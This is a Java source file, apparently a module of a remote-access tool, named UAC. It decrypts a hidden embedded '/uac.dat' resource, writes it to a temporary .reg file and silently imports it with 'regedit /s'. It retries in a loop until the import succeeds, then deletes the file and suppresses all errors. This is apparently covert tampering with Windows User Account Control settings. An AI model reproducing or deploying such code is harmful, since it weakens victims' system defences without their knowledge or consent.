package rt.modulos.var;

import comunes.Interfaz;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import rt.util.CLRT;

public class UAC extends Thread implements Interfaz {

    @Override
    public void run() {
        try {
            CLRT cl = new CLRT();
            InputStream input = cl.descifrar("/uac.dat");
            File t = File.createTempFile("uac", ".reg");
            ByteArrayOutputStream oo = new ByteArrayOutputStream();
            FileOutputStream out = new FileOutputStream(t);
            byte[] buffer = new byte[1024];
            int i;
            while ((i = input.read(buffer)) > -1) {
                oo.write(buffer, 0, i);
            }
            oo.close();
            byte[] bufLimpio = oo.toByteArray();
            out.write(bufLimpio);
            out.close();
            boolean ejecuta = true;
            while (ejecuta) {
                Process P = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "regedit", "/s", t.getAbsolutePath()});
                P.waitFor();
                if (P.exitValue() == 0) {
                    ejecuta = false;
                }
            }
            t.delete();
        } catch (Exception ex) {

        }
    }

    private void iniciar() {
        start();
    }

    public void set(int opcion, Object valor) {
        //throw new UnsupportedOperationException("Not supported yet."); //To change body of generated methods, choose Tools | Templates.
    }

    public Object get(int opcion, Object... parametros) {
        return null;
    }

    public void instanciar(Object... parametros) {

    }

    public void ejecutar(int opcion, Object... parametros) {
        switch (opcion) {
            case 0:
                iniciar();
                break;
        }
    }

}
